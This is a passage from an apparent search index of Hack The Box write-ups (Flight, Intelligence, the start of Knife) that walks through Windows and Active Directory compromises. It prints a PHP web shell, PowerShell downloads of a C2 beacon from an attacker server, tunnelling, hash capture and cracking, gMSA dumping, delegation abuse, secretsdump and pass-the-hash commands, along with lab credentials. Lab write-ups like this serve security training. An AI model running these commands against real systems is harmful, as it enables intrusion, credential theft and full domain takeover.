abc.ini\nputting file abc.ini as \\abc.ini (0.0 kb/s) (average 0.0 kb/s)\n</code></pre> <p>In the background run <code>Responder</code> to capture <code>c.bum</code> NTLM hash</p> <pre><code>[SMB] NTLMv2-SSP Hash     : c.bum::flight.htb:891a9343d1f245an</code></pre>"},{"location":"Writeups/machines/flight/writeup/#cracking-ntlm-hash-cbum","title":"Cracking NTLM Hash - c.bum","text":"<p>Again using hashcat we can attempt to crack it with <code>rockyou.txt</code> wordlist.</p> <pre><code>hahcat -m 5600 hash rockyou.txt\nC.BUM::flight.htb:8...\n..0:Tikkycoll_431012284\n</code></pre> <p>We obtained <code>c.bum</code> credentials: <code>c.bum:Tikkycoll_431012284</code> </p>"},{"location":"Writeups/machines/flight/writeup/#enumerating-shares-cbum","title":"Enumerating Shares - c.bum","text":"<p>Enumerating the shares of the user <code>c.bum</code> will reveal for us that the user have write permissions in the folder <code>web</code> the web directory is for <code>school.flight.htb</code></p>"},{"location":"Writeups/machines/flight/writeup/#initial-access","title":"Initial Access","text":"<p>By known that we can write into the web directory, we can upload PHP web shell to obtain command execution. </p> <p>First, we will create a simple PHP web shell that will allow us to execute system commands in the target using the following command: </p> <pre><code>echo '&lt;?=`$_GET[0]`?&gt;' &gt; image.php\n</code></pre> <p>Then, we will upload the web shell in the <code>images</code> directory using <code>smbclient</code></p> <pre><code>smbclient \\\\\\\\10.10.11.187\\\\web -U 'flight\\c.bum' --password 'Tikkycoll_431012284'\nTry \"help\" to get a list of possible commands.\nsmb: \\&gt; ls\n  .                                   D        0  Thu Feb  2 08:33:31 2023\n..                                  D        0  Thu Feb  2 08:33:31 2023\nflight.htb                          D        0  Thu Feb  2 08:32:01 2023\nschool.flight.htb                   D        0  Thu Feb  2 08:32:01 2023\n5056511 blocks of size 4096. 1254140 blocks available\nsmb: \\&gt; cd school.flight.htb\nsmb: \\school.flight.htb\\&gt; cd images\nsmb: \\school.flight.htb\\images\\&gt; put image.php\nputting file image.php as \\school.flight.htb\\images\\image.php (0.6 kb/s) (average 0.6 kb/s)\n</code></pre> <p>After uploading the web shell, we can now navigate to <code>http://school.flight.htb/images/image</code> and execute commands by passing system commands in  the parameter <code>0</code> .</p> <p></p>"},{"location":"Writeups/machines/flight/writeup/#maintain-access-cbum","title":"Maintain Access - c.bum","text":"<p>To obtain access in the target, we can upload C2 beacon. Here I used Havoc C2. In order to do it, first we upload our beacon in the target either hosting HTTP server or using SMB. I used here the first method:</p> LocalTarget <pre><code>python3 -m http.server 9090\n</code></pre> <pre><code>image.php?0=powershell -nop iwr http://10.10.14.&lt;&gt;:9090/demon.exe -o \\programdata\\demon.exe\n</code></pre> <p>Then, in the target, run the beacon to recieve callback in our C2 server</p> <pre><code>image.php?0=\\programdata\\demon.exe\n</code></pre> <p></p> <p>To run commands as <code>c.bum</code> we can use <code>runas_cs</code> tool: https://github.com/antonioCoco/RunasCs</p> <p>We will use Havoc to upload <code>runas_cs</code> to the target </p> <pre><code>powershell iwr http://10.10.14.45:9090/runas_cs.exe -o \\programdata\\cs.exe\n</code></pre> <p>Then run:</p> <pre><code>shell c:\\programdata\\cs.exe c.bum Tikkycoll_431012284 c:\\programdata\\demon.exe\n</code></pre> <p></p>"},{"location":"Writeups/machines/flight/writeup/#enumerating-the-target","title":"Enumerating the Target","text":"<p>Viewing the running services will reveal for us that there is a local web application running in port 8000</p> <p> </p> <p>Here we will upload <code>chisel</code> to access the local web application</p> <pre><code>powershell iwr http://10.10.14.45:9090/chisel.exe -o \\programdata\\ch.exe\n</code></pre> <p>In local machine run:</p> <pre><code>./chisel server -p 8443 --reverse\n</code></pre> <p></p> <p>In the target run: </p> <pre><code>shell c:\\programdata\\ch.exe client &lt;ip&gt;:8443 R:socks\n</code></pre> <p></p> <p>Then, we can access the web application using socks5 proxy and proxychains</p> <p></p> <p>By enumerating files will notice a writable folder by <code>c.bum</code> which is located at: <code>c:\\inetpub\\development</code> </p> <p> </p>"},{"location":"Writeups/machines/flight/writeup/#uploading-aspx-web-shell","title":"Uploading ASPX Web Shell","text":"<p>Let's try to upload a web shell in website:</p> <p>From Havoc C2, while running as <code>c.bum</code>, run: </p> <pre><code>upload /tmp/image.aspx c:\\inetpub\\development\\image.aspx\n</code></pre> <p>Then, navigate to <code>http://127.0.0.1:8000</code> and execute Havoc C2 Beacon. </p> <p></p> <p>Then, we obtained access as <code>DefaultAppPool</code> service account which have <code>SeImpersonate</code> privileges.</p> <p></p>"},{"location":"Writeups/machines/flight/writeup/#privilege-escalation","title":"Privilege Escalation","text":"<p>Because the service account <code>DefaultAppPool</code> have <code>SeImpersonate</code> privileges we can impersonate any user including the Local Admin. We can abuse this using  JuicyPotatoNG</p> <p>To escalate privileges into system, first upload JuicyPotato in the target: </p> <pre><code>powershell iwr http://10.10.14.45:9090/jp.exe -o \\programdata\\jp.exe\n</code></pre> <p>Then run: </p> <pre><code>shell \\programdata\\jp.exe -t * -p \"cmd.exe\" -a \"/c c:\\programdata\\demon.exe\"\n</code></pre> <p>Then, we will be able to obtain access as system with full privileges.</p> <p></p>"},{"location":"Writeups/machines/flight/writeup/#scenario-diagram","title":"Scenario Diagram","text":"<pre><code>graph LR\n  A[Attack Scenario] --&gt; B(Web Recon);\n  B --&gt; C{{flight.htb}} &amp; D{{school.flight.htb}};\n  D --&gt; E[/Local File Inclusion/] &amp; F[/Capture svc_apache Hash using Responder/] &amp; G[/svc_apache/]\n  A --&gt; H(Password Spray);\n  H --&gt; I[/m.moon/];\n  A --&gt; J(Enumerate Shares);\n  J --&gt; K{{Found Writable Share Shared Shared}} &amp; L{{Upload ini File}} &amp; N{{Found Writable Share Web}};\n  L --&gt; M[/c.bum/];\n  A --&gt; ini(Initial Access);\n  ini --&gt; upl{{Upload PHP Webshell}};\n  upl --&gt; rce[/Obtain RCE as svc_apache/] &amp; piv[/Pivot to c.bum/]; \n  A --&gt; priv(Privilege Esclation);\n  priv --&gt; p1{{Found Service Running in Port 800}} &amp; p2{{Used Chisel to Access it}} &amp; p3{{Upload ASPX Webshell}};\n  p3 --&gt; p4[/DefaultAppPool/] &amp; p5{{Escalate Priviles by abusing SeImpersonate Privileges}};\n  p5 --&gt; p6[/SYSTEM/];\n  style G fill:#dd1d1c;\n  style I fill:#dd1d1c;\n  style M fill:#dd1d1c;\n  style p4 fill:#dd1d1c;\n  style p6 fill:#dd1d1c;\n</code></pre>"},{"location":"Writeups/machines/intelligence/Intelligence/","title":"Overview","text":"<p>Intelligence was my best HTB Machine yet, where it was realist environment and real life scenario. Intelligence was based in Active Directory Penetration Test and mostly depeneds in enumeration to found a way into the Domain Admin. My HTB profile link</p>"},{"location":"Writeups/machines/intelligence/Intelligence/#machine-info","title":"Machine Info","text":"Operating System Difficulty IP Windows Medium 10.10.10.248"},{"location":"Writeups/machines/intelligence/Intelligence/#walkthrough","title":"Walkthrough","text":""},{"location":"Writeups/machines/intelligence/Intelligence/#recon","title":"Recon","text":""},{"location":"Writeups/machines/intelligence/Intelligence/#nmap","title":"nmap","text":"<pre><code>PORT     STATE SERVICE       REASON  VERSION\n53/tcp   open  domain        syn-ack Simple DNS Plus\n80/tcp   open  http          syn-ack Microsoft IIS httpd 10.0\n|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA\n| http-methods: |   Supported Methods: OPTIONS TRACE GET HEAD POST\n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: Intelligence\n88/tcp   open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2021-07-04 20:46:20Z)\n135/tcp  open  msrpc         syn-ack Microsoft Windows RPC\n139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn\n389/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=dc.intelligence.htb\n| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb\n| Issuer: commonName=intelligence-DC-CA/domainComponent=intelligence\n445/tcp  open  microsoft-ds? syn-ack\n464/tcp  open  kpasswd5?     syn-ack\n593/tcp  open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=dc.intelligence.htb\n| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb\n| Issuer: commonName=intelligence-DC-CA/domainComponent=intelligence\n3268/tcp open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=dc.intelligence.htb\n| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb\n| Issuer: commonName=intelligence-DC-CA/domainComponent=intelligence\n3269/tcp open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=dc.intelligence.htb\n| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb\nService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows\n</code></pre> <p>By looking into <code>nmap</code> scanning results, we will discover that the host is Domain Controller. Furthermore, port 80, 139, 445 are opened so we can enumerate web service and SMB shared folders. </p>"},{"location":"Writeups/machines/intelligence/Intelligence/#web-enumeration","title":"Web Enumeration","text":"<p>During inspecting the web application, we will identify a new directory <code>/documents</code> that contains multiple PDF files. Two documents can be identify if we hover over download button: <code>http://10.10.10.248/documents/2020-01-01-upload.pdf</code> and <code>http://10.10.10.248/documents/2020-12-15-upload.pdf</code> </p> <p></p> <p></p> <p>After downloading the PDF documents, I used <code>exiftool</code> to check the creator of document in order to enumerate domain users. </p> <p></p> <p>From the pattern of the PDF files name I identified that the naming format is using <code>2020-##-##-upload.pdf</code> where is <code>##</code> is two digits. </p>"},{"location":"Writeups/machines/intelligence/Intelligence/#fuzzing-documents","title":"Fuzzing Documents","text":"Collecting Domain Users <p>With the knowledge of this, made a list of 4 digits to run <code>wfuzz</code> in order to find valid PDF documents. </p> <ol> <li>I used the following command to create a sequence of 4 digits and insert <code>-</code> in the middle: </li> </ol> <pre><code>seq -w 0000 9999 | sed 's/../&amp;-/' &gt; nums\n</code></pre> <ol> <li>Then, I run <code>wfuzz</code> to fuzz target URL with my created list of 4 digits: </li> </ol> <pre><code>wfuzz -c -z file,nums -f output.json,json --sc 200 http://10.10.10.248/documents/2020-FUZZ-upload.pdf\n</code></pre> <p></p> <ol> <li>After that, collected all valid documents and I made a Python script to auto download the valid documents:</li> </ol> <pre><code>   import requests\n   from multiprocessing.pool import ThreadPool\n\n   def download_url(url):\n     print(\"downloading: \",url)\n\n     file_name_start_pos = url.rfind(\"/\") + 1\n     file_name = url[file_name_start_pos:]\n\n     r = requests.get(url, stream=True)\n     if r.status_code == requests.codes.ok:\n       with open(file_name, 'wb') as f:\n         for data in r:\n           f.write(data)\n     return url\n\n\n   urls = [\"http://10.10.10.248/documents/2020-01-04-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-01-02-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-01-01-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-01-10-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-01-22-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-01-30-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-01-25-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-01-23-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-01-20-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-02-11-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-02-28-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-02-24-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-02-23-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-02-17-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-03-04-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-03-05-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-03-12-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-03-21-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-03-17-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-03-13-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-04-04-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-04-02-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-04-23-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-04-15-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-05-07-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-05-03-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-05-01-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-05-24-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-05-29-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-05-21-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-05-20-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-05-17-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-05-11-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-06-21-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-06-30-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-06-28-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-06-25-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-06-26-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-06-22-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-06-15-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-06-14-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-06-12-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-06-08-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-06-04-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-06-07-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-06-03-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-06-02-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-07-08-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-07-06-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-07-02-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-07-24-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-07-20-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-08-20-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-08-19-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-08-09-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-08-01-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-08-03-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-09-05-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-09-04-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-09-02-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-09-06-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-09-29-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-09-27-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-09-22-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-09-16-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-09-11-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-09-13-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-09-30-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-10-05-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-10-19-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-11-10-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-11-06-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-11-03-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-11-01-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-11-13-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-11-11-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-11-30-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-11-24-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-12-15-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-12-10-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-12-30-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-12-28-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-12-24-upload.pdf\",\n           \"http://10.10.10.248/documents/2020-12-20-upload.pdf\"\n           ]\n\n   results = ThreadPool(5).imap_unordered(download_url, urls)\n   for r in results:\n       print(r)\n</code></pre> <ol> <li>Finally I collected all the users from downloaded documents using <code>exiftool</code>. </li> </ol> <pre><code>   exiftool 2020-01-01-upload.pdf | grep \"Creator\" | cut -f 2 -d \":\" | cut -f 2 -d \" \" &gt; users.txt\n\n   cat users.txt\n   William.Lee\n   Scott.Scott\n   Jason.Wright\n   Veronica.Patel\n   Jennifer.Thomas\n   Danny.Matthews\n   David.Reed\n   Stephanie.Young\n   Daniel.Shelton\n   ...\n</code></pre> Obtain the Password <p>Let's search for the password from documents. Since we have many PDF documents I created another Python script to automate the process of extracting the text from the all downloaded PDF documents: </p> <pre><code>#!/usr/bin/python3\nimport fitz\n\nfiles = [\"2020-01-04-upload.pdf\",\n        \"2020-01-02-upload.pdf\",\n        \"2020-01-01-upload.pdf\",\n        \"2020-01-10-upload.pdf\",\n        \"2020-01-22-upload.pdf\",\n        \"2020-01-30-upload.pdf\",\n        \"2020-01-25-upload.pdf\",\n        \"2020-01-23-upload.pdf\",\n        \"2020-01-20-upload.pdf\",\n        \"2020-02-11-upload.pdf\",\n        \"2020-02-28-upload.pdf\",\n        \"2020-02-24-upload.pdf\",\n        \"2020-02-23-upload.pdf\",\n        \"2020-02-17-upload.pdf\",\n        \"2020-03-04-upload.pdf\",\n        \"2020-03-05-upload.pdf\",\n        \"2020-03-12-upload.pdf\",\n        \"2020-03-21-upload.pdf\",\n        \"2020-03-17-upload.pdf\",\n        \"2020-03-13-upload.pdf\",\n        \"2020-04-04-upload.pdf\",\n        \"2020-04-02-upload.pdf\",\n        \"2020-04-23-upload.pdf\",\n        \"2020-04-15-upload.pdf\",\n        \"2020-05-07-upload.pdf\",\n        \"2020-05-03-upload.pdf\",\n        \"2020-05-01-upload.pdf\",\n        \"2020-05-24-upload.pdf\",\n        \"2020-05-29-upload.pdf\",\n        \"2020-05-21-upload.pdf\",\n        \"2020-05-20-upload.pdf\",\n        \"2020-05-17-upload.pdf\",\n        \"2020-05-11-upload.pdf\",\n        \"2020-06-21-upload.pdf\",\n        \"2020-06-30-upload.pdf\",\n        \"2020-06-28-upload.pdf\",\n        \"2020-06-25-upload.pdf\",\n        \"2020-06-26-upload.pdf\",\n        \"2020-06-22-upload.pdf\",\n        \"2020-06-15-upload.pdf\",\n        \"2020-06-14-upload.pdf\",\n        \"2020-06-12-upload.pdf\",\n        \"2020-06-08-upload.pdf\",\n        \"2020-06-04-upload.pdf\",\n        \"2020-06-07-upload.pdf\",\n        \"2020-06-03-upload.pdf\",\n        \"2020-06-02-upload.pdf\",\n        \"2020-07-08-upload.pdf\",\n        \"2020-07-06-upload.pdf\",\n        \"2020-07-02-upload.pdf\",\n        \"2020-07-24-upload.pdf\",\n        \"2020-07-20-upload.pdf\",\n        \"2020-08-20-upload.pdf\",\n        \"2020-08-19-upload.pdf\",\n        \"2020-08-09-upload.pdf\",\n        \"2020-08-01-upload.pdf\",\n        \"2020-08-03-upload.pdf\",\n        \"2020-09-05-upload.pdf\",\n        \"2020-09-04-upload.pdf\",\n        \"2020-09-02-upload.pdf\",\n        \"2020-09-06-upload.pdf\",\n        \"2020-09-29-upload.pdf\",\n        \"2020-09-27-upload.pdf\",\n        \"2020-09-22-upload.pdf\",\n        \"2020-09-16-upload.pdf\",\n        \"2020-09-11-upload.pdf\",\n        \"2020-09-13-upload.pdf\",\n        \"2020-09-30-upload.pdf\",\n        \"2020-10-05-upload.pdf\",\n        \"2020-10-19-upload.pdf\",\n        \"2020-11-10-upload.pdf\",\n        \"2020-11-06-upload.pdf\",\n        \"2020-11-03-upload.pdf\",\n        \"2020-11-01-upload.pdf\",\n        \"2020-11-13-upload.pdf\",\n        \"2020-11-11-upload.pdf\",\n        \"2020-11-30-upload.pdf\",\n        \"2020-11-24-upload.pdf\",\n        \"2020-12-15-upload.pdf\",\n        \"2020-12-10-upload.pdf\",\n        \"2020-12-30-upload.pdf\",\n        \"2020-12-28-upload.pdf\",\n        \"2020-12-24-upload.pdf\",\n        \"2020-12-20-upload.pdf\"\n        ]\n\nfor i in files: \n        with fitz.open(i) as doc:\n            text = \"\"\n            for page in doc: \n                text += page.getText()\n\n        print(text)\n</code></pre> <p>By running the script and go through the output we will identify the password which is <code>NewIntelligenceCorpUser9876</code></p> <p></p>"},{"location":"Writeups/machines/intelligence/Intelligence/#password-spray","title":"Password Spray","text":"<p>With the obtained password, now we can run password spray against the collected domain users: </p> <pre><code>crackmapexec smb 10.10.10.248 -u users.txt -p \"NewIntelligenceCorpUser9876\"\n</code></pre> <p></p> <p>We obtained user <code>tiffany.molina</code> credentials. Now we can get <code>user.txt</code> from users shared file using <code>smbclient</code>. </p> <pre><code>smbclient \\\\\\\\10.10.10.248\\\\Users -U 'workgroup\\Tiffany.Molina'\n</code></pre> <p></p>"},{"location":"Writeups/machines/intelligence/Intelligence/#pivot-to-tedgraves","title":"Pivot to <code>Ted.Graves</code>","text":""},{"location":"Writeups/machines/intelligence/Intelligence/#smb-shares-enumeration","title":"SMB Shares Enumeration","text":"<p>The domain user <code>Tiffany.Molina</code> have also access to <code>IT</code> shared folder, let's inspect it. </p> <pre><code>\u039e Intelligence/dump \u2192 smbclient \\\\\\\\10.10.10.248\\\\IT -U 'workgroup\\Tiffany.Molina' \nEnter WORKGROUP\\Tiffany.Molina's password: \nTry \"help\" to get a list of possible commands.\nsmb: \\&gt; ls\n  .                                   D        0  Sun Apr 18 20:50:55 2021\n..                                  D        0  Sun Apr 18 20:50:55 2021\ndowndetector.ps1                    A     1046  Sun Apr 18 20:50:55 2021\n\n3770367 blocks of size 4096. 1362603 blocks available\nsmb: \\&gt; get downdetector.ps1 </code></pre> <p>I found Powershell script inside <code>IT</code> shared folder. </p> <p>By inspecting the Powershell script, I identified that the script runs every 5 minutes, it makes a request to web server that contains <code>web*</code>. </p> <pre><code># Check web server status. Scheduled to run every 5min\nImport-Module ActiveDirectory \nforeach($record in Get-ChildItem \"AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb\" | Where-Object Name -like \"web*\")  {\ntry {\n$request = Invoke-WebRequest -Uri \"http://$($record.Name)\" -UseDefaultCredentials\nif(.StatusCode -ne 200) {\nSend-MailMessage -From 'Ted Graves &lt;Ted.Graves@intelligence.htb&gt;' -To 'Ted Graves &lt;Ted.Graves@intelligence.htb&gt;' -Subject \"Host: $($record.Name) is down\"\n}\n} catch {}\n}\n</code></pre> Obtain <code>Ted.Graves</code> NTLM Hash <p>We can abuse this by adding a DNS record using <code>dnstool</code> and run <code>Responder</code> to receive the NTLM hash of the user <code>ted.graves</code>. </p> <p><code>dnstool</code> can be found here</p> <pre><code>python3 dnstool.py -u 'intelligence.htb\\Tiffany.Molina' -p NewIntelligenceCorpUser9876 --action add -r websomething.intelligence.htb -d 10.10.14.x 10.10.10.248\n</code></pre> <p></p> <p>Then run <code>responder</code> to receive the NTLM hash</p> <pre><code>sudo responder -I tun0\n</code></pre> <p></p> Obtain <code>Ted.Graves</code> Password <p>Now we found the NTLM hash of the user <code>ted.graves</code>, we can use <code>hashcat</code> to crack it: </p> <pre><code>hashcat -a 0 -m 5600 ted.graves-ntlm  /usr/share/wordlists/rockyou.txt --force\n</code></pre> <p></p>"},{"location":"Writeups/machines/intelligence/Intelligence/#enumerate-the-domain-controller","title":"Enumerate the Domain Controller","text":"Running BloodHound <p>After obtaining <code>ted.graves</code> credentials lets run <code>BloodHound</code> to enumerate the Domain Controller, in order to find any path to Domain Admin. </p> <p>We can use <code>bloodhound-python</code> in Kali, but I prefer to use the Windows Powershell version because it give us more accurate results. </p> <p>To use <code>bloodhound-python</code> use the following command: </p> <pre><code>bloodhound-python -u 'ted.graves' -p 'Mr.Teddy' -ns 10.10.10.248 -d intelligence.htb -c all  --dns-tcp\n</code></pre> <p>But it will not give you all attack paths.  </p> <p></p> <p>BloodHound gave us a new attack path into Domain Admin. <code>ted.graves</code> is member of <code>IT Support</code> group, which all members of <code>IT Support</code> group can read <code>gMSAPassword</code> of <code>SVC_INT</code> domain user. <code>SVC_INT</code> is allowed to delegate into the Domain Controller. </p> <p>With this known now we can compromise the Domain Controller by chaining two attack paths: </p> <p>1- Reading <code>gMSAPassword</code> of the domain user <code>SVC_INT</code>. </p> <p>Further Reading: https://stealthbits.com/blog/securing-gmsa-passwords/</p> <p>2- Constrained Delegation. </p> <p>Further Reading: https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation</p>"},{"location":"Writeups/machines/intelligence/Intelligence/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"Writeups/machines/intelligence/Intelligence/#abuse-gmsa-password","title":"Abuse gMSA Password","text":"<p>Again we can use Kali or Windows to abuse this misconfiguration. I used Windows to obtain <code>SVC_INT</code> NTLM hash using the following command: </p> <pre><code>$gmsa = Get-ADServiceAccount -Identity 'SVC_INT' -Properties 'msDS-ManagedPassword' -Server 10.10.10.248\n$blob = $gmsa.'msDS-ManagedPassword'\n$mp = ConvertFrom-ADManagedPasswordBlob $blob\n$hash1 =  ConvertTo-NTHash -Password $mp.SecureCurrentPassword\n</code></pre> <p>Or from Kali Linux we can use <code>gMSADumper</code> from this link</p> <pre><code>python3 gMSADumper.py -u ted.graves -p Mr.Teddy -d intelligence.htb \nsvc_int$:::d64b83fe606e6d3005e20ce0ee932fe2\n</code></pre> <p>We found domain user <code>SVC_INT</code> NTLM hash which is <code>d64b83fe606e6d3005e20ce0ee932fe2</code> </p>"},{"location":"Writeups/machines/intelligence/Intelligence/#abuse-constrained-delegation","title":"Abuse Constrained Delegation","text":"<p>First of all, we need to find which service that <code>SVC_INT</code> can access. We can use <code>rpcclient</code> from Kali or <code>Get-DomainComputer</code> from <code>PowerView</code> module. </p> <p>I found that the domain user <code>SVC_INT</code> can access the service <code>www/dc.intelligence.htb</code>. </p> <p>Now we have service which we can abuse to request a Kerberos tickets to exploit delegation configuration. We can use Impackets <code>getST.py</code> to impersonate the administrator by passing flag <code>-impersonate</code>. </p> <pre><code>getST.py intelligence.htb/svc_int$ -spn WWW/dc.intelligence.htb -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate Administrator\nImpacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation\n\n[*] Getting TGT for user\n[*] Impersonating Administrator\n[*]     Requesting S4U2self\n[*]     Requesting S4U2Proxy\n[*] Saving ticket in Administrator.ccache\n</code></pre> <p>Before running the command make sure Kali time is sync with the target machine. </p> <pre><code>sudo ntpdate 10.10.10.248\n</code></pre> <p>Obtaining administrator tickets will allow us to have full administrator privilege in the Domain Controller, we can pass the tickets to dump all domain controller NTLM hashes. But before that we have to store the into the variable <code>KRB4CCNAME</code>:</p> <pre><code>export KRB5CCNAME=Administrator.ccache   </code></pre> <p>Finally, I used Impacket tool <code>secretdumps.py</code> to dump all domain users hashes including the Domain Admin. </p> <pre><code>secretsdump.py -k -no-pass dc.intelligence.htb\n</code></pre> <p></p> <p>We will find the NTLM hash of the Domain Admin.  </p> <p></p> <p></p> <p>We can use Domain Admin NTLM hash as pass the hash to read <code>root.txt</code> flag using <code>crackmapexec</code> </p> <p></p> <pre><code>crackmapexec smb 10.10.10.248 -u administrator -H '9075113fe16cf74f7c0f9b27e882dad3' -x 'more C:\\users\\administrator\\desktop\\root.txt'\n</code></pre>"},{"location":"Writeups/machines/intelligence/Intelligence/#lesson-learned","title":"Lesson Learned","text":"<ol> <li>Enumerating PDF documents to find users. </li> <li>NTLM relay attacks.</li> <li>Abuse gMSA Password</li> <li>Abuse Constrained Delegation</li> </ol>"},{"location":"Writeups/machines/knife/knife-writeup/","title":"Overview","text":""},{"location":"Writeups/machines/knife/knife-writeup/#machine-info","title":"Machine Info","text":"Operating System Difficulty IP Linux Easy 10.10.10.241"},{"location":"Writeups/machines/knife/knife-writeup/#walkthrough","title":"Walkthrough","text":""},{"location":"Writeups/machines/knife/knife-writeup/#recon","title":"Recon","text":""},{"location":"Writeups/machines/knife/knife-writeup/#nmap","title":"nmap","text":"<pre><code>PORT   STATE SERVICE REASON  VERSION\n22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: |   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)\n| ssh-rsa 